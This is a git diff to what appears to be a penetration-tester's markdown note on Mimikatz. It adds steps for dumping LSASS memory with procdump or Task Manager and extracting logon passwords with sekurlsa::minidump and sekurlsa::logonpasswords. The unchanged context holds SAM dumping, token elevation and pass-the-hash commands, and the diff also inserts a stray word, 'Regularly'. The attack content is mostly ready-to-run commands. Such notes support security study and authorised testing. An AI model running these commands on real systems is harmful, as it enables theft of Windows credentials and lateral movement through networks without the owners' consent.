@@ -43,7 +43,7 @@ lsadump::sam # Dump SAM database
 ```
 
 ### Extracting NTLM hashes from LSASS memory
-
+Regularly
 ```powershell
 privilege::debug
 token::elevate
@@ -55,6 +55,20 @@ These hashes can be used to perform [[Pass-The-Hash]] attacks by using `mimikatz
 token::revert
 sekurlsa::pth /user:<username> /domain:<domain-name> /ntlm:<ntlm hash> /run:"<cmds goes here>"
 ```
+
+Alternatively we `SeDebug` privilege use [[Sysinternals-Procdump]] or `Taskmanager`,  then `mimikatz`
+```powershell
+# Or Taskmanager -> [Right Click] lsass.exe -> Create dump file 
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+# run mimikatz use log file if required
+mimikatz.exe
+log # if required
+# Target the memory dump
+sekurlsa::minidump lsass.dmp
+# Extract logonpasswords
+sekurlsa::logonpasswords
+```
+
 
 ## Kerberos Attacks
 Used in [[Attacking-Kerberos]] see the detailed mechanics of Kerberos and [[Active-Directory-Kerberos-Authenication-Defined]]. It is credential base so understanding [[Active-Directory-Authentication]] in part for [[Active-Directory-Privilege-Escalation]] and [[Active-Directory-Lateral-Movement]] as it is capable of command execution.
